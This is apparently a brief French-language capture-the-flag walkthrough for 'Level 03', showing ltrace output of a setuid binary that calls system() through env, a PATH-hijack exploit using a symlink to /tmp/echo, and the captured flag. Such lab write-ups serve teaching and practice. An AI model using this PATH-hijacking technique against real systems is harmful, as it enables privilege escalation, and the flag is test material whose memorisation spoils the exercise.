# Level 03

- `ltrace ./level03`
<pre>
__libc_start_main(0x80484a4, 1, 0xffb03b24, 0x8048510
getegid()                                 = 1000
geteuid()                                 = 1000
setresgid(1000, 1000, 1000, 0xf7d42d15)   = 0
setresuid(1000, 1000, 1000, 0xf7d42d15)   = 0
<strong>system("/usr/bin/env echo Exploit me")   = 0</strong> 
--- SIGCHLD (Child exited) ---
+++ exited (status 0) +++
</pre>
- Une commande est executé alors on desside de faire passer getflag pour echo
- `ln -s /bin/getflag /tmp/echo`
- `PATH=/tmp ./level03`
- flag: `qi0maab88jeaj46qoumi7maus`
